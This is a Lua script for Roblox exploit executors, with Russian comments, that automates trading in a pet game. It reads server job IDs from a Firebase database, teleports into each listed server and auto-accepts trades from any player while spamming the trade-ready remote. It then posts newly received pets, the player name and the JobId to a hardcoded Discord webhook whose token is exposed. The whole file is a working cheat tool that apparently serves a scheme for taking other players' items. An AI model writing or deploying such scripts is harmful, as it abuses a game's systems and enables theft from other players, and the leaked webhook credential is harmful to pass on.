local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

-- === FIREBASE ===
local FIREBASE_BASE = "https://api2-3dee6-default-rtdb.europe-west1.firebasedatabase.app"
local SERVERS_URL = FIREBASE_BASE .. "/servers.json"

-- === SETTINGS ===
local PLACE_ID = game.PlaceId
local MAX_AGE = 180 -- свежесть серверов (сек)
local CHECK_DELAY = 3
local TRADE_CHECK_DELAY = 0.5

-- HTTP (под все executors)
local httpRequest = request or http_request or (syn and syn.request)

-- visited сервера (анти дубль)
local visited = {}

print("🤖 Smart Watcher + Auto Trade Started")

local function getBackpackPets()
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then
        return {}
    end

    local pets = {}

    for _, item in ipairs(backpack:GetChildren()) do
        local displayName = item:GetAttribute("DisplayName") or item.Name

        table.insert(pets, {
            instance = item,
            name = displayName
        })
    end

    return pets
end

-- === REMOTE TRADE ===
local tradeRemote = ReplicatedStorage
    :WaitForChild("Shared")
    :WaitForChild("Remotes")
    :WaitForChild("Networking")
    :WaitForChild("RF/TradeRespondToOffer")

-- === УДАЛЕНИЕ СЕРВЕРА ИЗ БД ===
local function deleteServer(key)
    if not httpRequest then return end

    pcall(function()
        httpRequest({
            Url = FIREBASE_BASE .. "/servers/" .. key .. ".json",
            Method = "DELETE"
        })
    end)

    print("🗑️ Deleted server:", key)
end

-- === АВТО ЗАХОД В СЕРВЕР ===
local function joinServer(jobId, key)
    if not jobId then return end

    -- если это текущий сервер — удаляем чтобы не было loop
    if jobId == game.JobId then
        deleteServer(key)
        return
    end

    visited[jobId] = true
    print("🚀 Joining server:", jobId)

    local success = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            PLACE_ID,
            jobId,
            player
        )
    end)

    if success then
        deleteServer(key)
    end
end

-- === AUTO TRADE ACCEPT LOOP ===
task.spawn(function()
    while task.wait(TRADE_CHECK_DELAY) do
        local playerGui = player:FindFirstChild("PlayerGui")
        if not playerGui then continue end

        local tradeGui = playerGui:FindFirstChild("TradeRequest")
        if not tradeGui then continue end

        if tradeGui.Enabled == true then
            print("💰 Trade request detected!")

            -- пробуем принять трейд от любого игрока
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= player then
                    local userId = tostring(plr.UserId)

                    pcall(function()
                        tradeRemote:InvokeServer(userId, true)
                    end)

                    task.wait(0.5)
                end
            end
        end
    end
end)



local WEBHOOK_URL = "https://discord.com/api/webhooks/1475173653883781274/YztYmpQSqJPSwqiaoEozduTgXuzoxoO0-GGVqK18SVEgv2vg3-u0uWqC39LQgPGZ2FpM" -- вставишь свою ссылку

local function sendTradeWebhook(text)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    
    local data = {
        content = "📊 Trade Logger",
        embeds = {
            {
                title = "Trade Status",
                description = text,
                color = 5763719,
                fields = {
                    {name = "Player", value = player.Name, inline = true},
                    {name = "JobId", value = game.JobId, inline = false},
                    {name = "PlaceId", value = tostring(game.PlaceId), inline = false}
                }
            }
        }
    }

    local body = HttpService:JSONEncode(data)

    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        elseif http_request then
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end
    end)
end



local readyRemote = ReplicatedStorage
    :WaitForChild("Shared")
    :WaitForChild("Remotes")
    :WaitForChild("Networking")
    :WaitForChild("RE/Trading/TradeReadyTrade")

local tradeActive = false
local webhookSentOpen = false
local oldPetsList = {}

task.spawn(function()
    while task.wait(0.2) do
        local playerGui = player:FindFirstChild("PlayerGui")
        if not playerGui then continue end

        local menus = playerGui:FindFirstChild("Menus")
        if not menus then continue end

        local tradeMenu = menus:FindFirstChild("Trade")
        if not tradeMenu then continue end

        -- трейд открылся
        if tradeMenu.Visible and not tradeActive then
            tradeActive = true
            webhookSentOpen = false

            print("📦 Trade menu detected, waiting 6 seconds...")

            -- сохраняем текущее состояние инвентаря
            oldPetsList = getBackpackPets()

            -- вебхук: окно трейда открыто (один раз)
            if not webhookSentOpen then
                webhookSentOpen = true
                sendTradeWebhook("🟢 Trade window opened")
            end

            task.wait(5)

            task.spawn(function()
                while tradeMenu.Visible do
                    for i = 0, 9 do
                        if not tradeMenu.Visible then
                            tradeActive = false
                            break
                        end

                        local args = { true, i }
                        pcall(function()
                            readyRemote:FireServer(unpack(args))
                        end)

                        task.wait(0.1)
                    end

                    if tradeMenu.Visible then
                        task.wait(8.5)
                    end
                end

                -- когда трейд закрылся
                if tradeActive then
                    -- получаем новый список петов
                    local newPetsList = getBackpackPets()

                    -- ищем новые петы по INSTANCE (без стака одинаковых имен)
                    local newPets = {}
                    local oldInstances = {}
                    
                    -- запоминаем старые инстансы
                    for _, petData in ipairs(oldPetsList) do
                        if petData.instance then
                            oldInstances[petData.instance] = true
                        end
                    end
                    
                    -- ищем реально новые предметы
                    for _, petData in ipairs(newPetsList) do
                        if petData.instance and not oldInstances[petData.instance] then
                            table.insert(newPets, petData.name)
                        end
                    end

                    -- формируем текст для вебхука
                    local text = "✅ Trade completed successfully (window closed)"
                    if #newPets > 0 then
                        text = text .. "\n🎁 New Pets:\n" .. table.concat(newPets, "\n")
                    end

                    sendTradeWebhook(text)
                end

                tradeActive = false
                webhookSentOpen = false
                print("❌ Trade menu closed, stopping ready loop")
            end)
        end
    end
end)




-- === SERVER WATCHER LOOP ===
while task.wait(CHECK_DELAY) do
    if not httpRequest then
        warn("HTTP not supported")
        break
    end

    local success, response = pcall(function()
        return game:HttpGet(SERVERS_URL)
    end)

    if not success or not response or response == "null" then
        continue
    end

    local data
    local ok = pcall(function()
        data = HttpService:JSONDecode(response)
    end)

    if not ok or not data then
        continue
    end

    for key, server in pairs(data) do
        local jobId = server.jobId
        local placeId = server.placeId
        local timestamp = server.time or 0

        if jobId
        and placeId == PLACE_ID
        and not visited[jobId]
        and (os.time() - timestamp <= MAX_AGE) then

            joinServer(jobId, key)
            task.wait(8)
            break
        else
            -- авто чистка старых серверов (>10 минут)
            if timestamp and (os.time() - timestamp > 600) then
                deleteServer(key)
            end
        end
    end
end
